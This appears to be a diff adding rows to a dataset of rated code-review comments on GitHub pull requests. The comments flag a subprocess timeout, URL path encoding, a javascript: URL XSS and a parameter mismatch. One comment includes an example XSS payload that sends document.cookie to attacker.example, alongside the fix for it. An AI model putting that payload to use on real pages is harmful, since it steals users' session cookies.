@@ -9161,3 +9161,61 @@ You'll also want to catch `subprocess.TimeoutExpired`:
         logger.error(""Doxygen timed out after 300 seconds. Skipping C++ API doc generation."")
         return {}
 ```",https://github.com/nvidia-holoscan/holohub/pull/1441#discussion_r2897649468,,2026-03-06T20:11:03.892000,Missing subprocess timeout causes indefinite CI build hang,resource_leak,high,8,"The subprocess.run() call to Doxygen has no timeout, meaning if Doxygen stalls (macro loops, circular includes, I/O issues), the entire CI build hangs indefinitely with no recovery. This is a meaningful production bug that would cause real CI failures and blocked deployments.",2026-03-07T04:38:40.908051+00:00
+simstudioai/sim,3455,feat(obsidian): add Obsidian integration with 15 tools,https://github.com/simstudioai/sim/pull/3455,"**`encodeURIComponent` encodes `/` in file paths, breaking subdirectory notes**
+
+`encodeURIComponent(params.filename.trim())` encodes the entire path including `/` separators (e.g. `""folder/note.md""` becomes `folder%2Fnote.md`). The Obsidian Local REST API expects path segments in the URL (e.g. `/vault/folder/note.md`), so any note inside a subdirectory will return 404.
+
+The `list_files.ts` tool already handles this correctly by splitting on `/` and encoding each segment separately. The same pattern needs to be applied here.
+
+```suggestion
+      return `${base}/vault/${params.filename.trim().split('/').map(encodeURIComponent).join('/')}`
+```
+
+This same issue affects the following files, which all need the same fix:
+- `apps/sim/tools/obsidian/append_note.ts` (line 26)
+- `apps/sim/tools/obsidian/create_note.ts` (line 25)
+- `apps/sim/tools/obsidian/delete_note.ts` (line 18)
+- `apps/sim/tools/obsidian/patch_note.ts` (line 26)
+- `apps/sim/tools/obsidian/open_file.ts` (line 22 — uses `/open/` endpoint but same problem)",https://github.com/simstudioai/sim/pull/3455#discussion_r2899141307,"Fixed in 722528825 — same fix applied across all 6 affected files (get_note, create_note, append_note, patch_note, delete_note, open_file).",2026-03-07T06:48:47.447000,encodeURIComponent breaks subdirectory file paths in Obsidian API,logic,high,8,"This is a meaningful logic bug that would cause 404 errors for any Obsidian notes in subdirectories, breaking core functionality for many users. The reviewer correctly identified the encoding issue, explained why it happens, provided a working fix, and helpfully listed all 6 affected files that need the same correction. This isn't an obvious compile-time error - it would only manifest at runtime with specific inputs.",2026-03-07T08:14:52.485253+00:00
+gptme/gptme,1621,feat(config): add [agent.urls] to AgentConfig for named agent links,https://github.com/gptme/gptme/pull/1621,"Unvalidated URL scheme allows `javascript:` execution
+
+`agent.urls.dashboard` is sourced directly from `gptme.toml` via the API and rendered as an `href` with no scheme validation. If a workspace config contains:
+
+```toml
+[agent.urls]
+dashboard = ""javascript:fetch('https://attacker.example/?c='+document.cookie)""
+```
+
+…clicking the link will execute that code in the browser. The `rel=""noopener noreferrer""` guard only prevents window-opener abuse — it does not block `javascript:` URLs.
+
+A simple allowlist guard on the scheme is sufficient:
+
+```tsx
+const safeDashboardUrl =
+  /^https?:\/\//i.test(agent.urls.dashboard) ? agent.urls.dashboard : null;
+```
+
+Then use `safeDashboardUrl` in the `href` (and skip rendering when `null`). Alternatively, validate the URL when it is first loaded in `workspaceUtils.ts` so that all URLs in the `Agent` interface are already safe.",https://github.com/gptme/gptme/pull/1621#discussion_r2899038196,Fixed in aeae2a4 — added `/^https?:\/\//i.test()` guard so non-http(s) URLs are silently ignored rather than rendered as hrefs.,2026-03-07T05:30:39.377000,JavaScript URL injection allows XSS via config file,security,high,8,"This is a genuine XSS vulnerability where user-controlled data from gptme.toml config files is rendered as href without scheme validation, allowing javascript: URL execution that could steal cookies or perform actions as the user. The fix with an https/http scheme allowlist is the correct mitigation.",2026-03-07T08:14:52.485253+00:00
+onyx-dot-app/onyx,9162,feat: rotate encryption key utility,https://github.com/onyx-dot-app/onyx/pull/9162,"**Mismatched parameter name breaks MIT encrypt callers**
+
+The second parameter of `_encrypt_string` is named `_` rather than the expected name. The wrapper `encrypt_string_to_bytes` (line 95) now always invokes the resolved function using the keyword argument form that matches what the EE function expects. In MIT mode, Python raises a `TypeError` because the parameter names do not match.
+
+This breaks every call to `encrypt_string_to_bytes` in MIT deployments — including normal credential writes — not just rotation. The MIT `_decrypt_bytes` (line 21) correctly uses the right parameter name with `# noqa: ARG001`; the same fix is needed here to maintain consistency.
+
+<details><summary>Prompt To Fix With AI</summary>
+
+`````markdown
+This is a comment left during a code review.
+Path: backend/onyx/utils/encryption.py
+Line: 14
+
+Comment:
+**Mismatched parameter name breaks MIT encrypt callers**
+
+The second parameter of `_encrypt_string` is named `_` rather than the expected name. The wrapper `encrypt_string_to_bytes` (line 95) now always invokes the resolved function using the keyword argument form that matches what the EE function expects. In MIT mode, Python raises a `TypeError` because the parameter names do not match.
+
+This breaks every call to `encrypt_string_to_bytes` in MIT deployments — including normal credential writes — not just rotation. The MIT `_decrypt_bytes` (line 21) correctly uses the right parameter name with `# noqa: ARG001`; the same fix is needed here to maintain consistency.
+
+How can I resolve this? If you propose a fix, please make it concise.
+`````
+</details>",https://github.com/onyx-dot-app/onyx/pull/9162#discussion_r2899058259,,2026-03-07T05:50:37.796000,Parameter name mismatch causes TypeError in MIT deployments,runtime,high,8,"This catches a real runtime bug where the wrapper function calls the MIT implementation with a keyword argument 'key=' but the MIT function uses '_' as the parameter name, causing a TypeError on every encrypt call in MIT deployments. This would break all credential writes.",2026-03-07T08:14:52.485253+00:00
